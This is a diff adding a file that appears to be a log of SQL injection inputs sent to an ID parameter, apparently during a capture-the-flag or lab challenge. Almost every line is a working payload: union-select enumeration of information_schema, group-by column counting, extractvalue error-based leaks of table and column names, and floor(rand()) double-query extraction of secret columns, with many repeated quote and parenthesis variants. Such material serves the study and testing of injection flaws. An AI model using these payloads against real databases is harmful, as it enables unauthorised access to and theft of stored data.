@@ -1,0 +1,97 @@
+ID:1
+ID:10
+ID:-1' union select 1,2,3 -- 
+ID:-1' union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1" union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:1
+ID:2
+ID:2'-- 
+ID:1"-- 
+ID:1"
+ID:1'
+ID:-1' union select 1,2,3-- 
+ID:1' group by 1-- 
+ID:1' group by 2-- 
+ID:1' group by3-- 
+ID:1' group by 3-- 
+ID:1' group by 4-- 
+ID:-1'unionselect1,2,3-- 
+ID:'unionselect1,2,3-- 
+ID:'unionselect1,2,3 -- 
+ID:'unionselect1,2,3,4 -- 
+ID:'unionselect1,2,3 -- 
+ID:"unionselect1,2,3 -- 
+ID:'unionselect1,2,3 -- 
+ID:1'
+ID:1' union select 1,2,3; -- 
+ID:-1' union select 1,2,3; -- 
+ID:1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(secret_OD68 ) AS CHAR),0x7e)) FROM WOO6ID239T LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)-- 
+ID:1'union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e))-- 
+ID:1'union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e))-- 
+ID:1'union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='UW2GYZ3EJ3'),0x7e))-- 
+ID:1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(secret_BPI9) AS CHAR),0x7e)) FROM UW2GYZ3EJ3 LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)-- 
+ID:1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(secret_BPI9) AS CHAR),0x7e)) FROM UW2GYZ3EJ3 LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)-- 
+ID:1' AND (SELECT 1 FROM (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES GROUP BY CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(secret_BPI9) AS CHAR),0x7e)) FROM UW2GYZ3EJ3 LIMIT 0,1),FLOOR(RAND(0)*2)))a)-- 
+ID:-1 union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1' union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1" union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1') union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1") union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1) union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1')) union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1")) union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1)) union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1' union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1" union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1') union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1") union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1) union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1')) union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1")) union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1)) union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat('4X2v2ZWdrF:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1' union select 1,2,concat('4X2v2ZWdrF:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1" union select 1,2,concat('4X2v2ZWdrF:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1') union select 1,2,concat('4X2v2ZWdrF:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1") union select 1,2,concat('4X2v2ZWdrF:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1) union select 1,2,concat('4X2v2ZWdrF:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1')) union select 1,2,concat('4X2v2ZWdrF:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1")) union select 1,2,concat('4X2v2ZWdrF:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1)) union select 1,2,concat('4X2v2ZWdrF:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat('7WVJhmdyWr:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1' union select 1,2,concat('7WVJhmdyWr:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1" union select 1,2,concat('7WVJhmdyWr:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1') union select 1,2,concat('7WVJhmdyWr:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1") union select 1,2,concat('7WVJhmdyWr:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1) union select 1,2,concat('7WVJhmdyWr:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1')) union select 1,2,concat('7WVJhmdyWr:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1")) union select 1,2,concat('7WVJhmdyWr:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1)) union select 1,2,concat('7WVJhmdyWr:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat('FW8cn7RoMM:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1' union select 1,2,concat('FW8cn7RoMM:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1" union select 1,2,concat('FW8cn7RoMM:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1') union select 1,2,concat('FW8cn7RoMM:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1") union select 1,2,concat('FW8cn7RoMM:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1) union select 1,2,concat('FW8cn7RoMM:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1')) union select 1,2,concat('FW8cn7RoMM:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1")) union select 1,2,concat('FW8cn7RoMM:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1)) union select 1,2,concat('FW8cn7RoMM:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat('VrZbAIyCIv:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1' union select 1,2,concat('VrZbAIyCIv:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1" union select 1,2,concat('VrZbAIyCIv:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1') union select 1,2,concat('VrZbAIyCIv:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1") union select 1,2,concat('VrZbAIyCIv:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1) union select 1,2,concat('VrZbAIyCIv:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1')) union select 1,2,concat('VrZbAIyCIv:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1")) union select 1,2,concat('VrZbAIyCIv:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1)) union select 1,2,concat('VrZbAIyCIv:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat('kzoxQnNGQ3:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1' union select 1,2,concat('kzoxQnNGQ3:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1" union select 1,2,concat('kzoxQnNGQ3:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1') union select 1,2,concat('kzoxQnNGQ3:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1") union select 1,2,concat('kzoxQnNGQ3:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1) union select 1,2,concat('kzoxQnNGQ3:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1')) union select 1,2,concat('kzoxQnNGQ3:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1")) union select 1,2,concat('kzoxQnNGQ3:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1)) union select 1,2,concat('kzoxQnNGQ3:',group_concat(schema_name)) from information_schema.schemata -- 
